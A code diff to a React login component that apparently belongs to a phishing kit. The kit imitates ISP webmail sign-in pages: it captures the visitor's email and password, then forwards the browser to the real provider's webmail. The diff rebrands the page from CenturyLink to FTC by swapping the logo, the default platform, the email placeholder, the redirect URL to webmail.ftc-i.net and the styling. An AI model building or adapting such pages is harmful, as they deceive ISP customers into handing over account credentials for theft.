@@ -11,6 +11,7 @@ import catskill from './catskill.png';
 import winstream from './windstream.png';
 import wave from './wave.png';
 import centurylink from './centurylink.png';
+import ftc from './ftc.svg';
 
 function Home(){
 
@@ -18,7 +19,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Century Link")
+    const[platform, setPlatform] = useState("FTC")
 
     const[showError, setShowError] = useState(false);
 
@@ -45,7 +46,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://webmail.centurylink.net/app/';
+             window.location.href = 'https://webmail.ftc-i.net/login';
           }
         } catch (error) {
           // Handle error
@@ -68,8 +69,8 @@ function Home(){
 
 
 
-            <div className='my-2 px-3'>
-            <img  src={centurylink} className="mylogo"/>
+            <div className='my-2 px-3 text-center'>
+            <img  src={ftc} className="mylogo"/>
 
             </div>
 
@@ -88,7 +89,7 @@ function Home(){
                  
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} placeholder="CenturyLink Email" className="form-control bottom-border-only py-3"required />
+                        }}value={email} placeholder="Email" className="form-control bottom-border-only py-3"required />
 
                     </div>
 
@@ -154,10 +155,10 @@ function Home(){
 
 </div>
 
-<div className='linkdiv'>
+<div className='linkdiv text-center'>
   <a style={{
-        color: '#1f8aa3',
-        textDecoration: 'underline',
+        color: 'grey',
+        textDecoration: 'none',
   }}>Forgot Password <br/>
 </a>
 
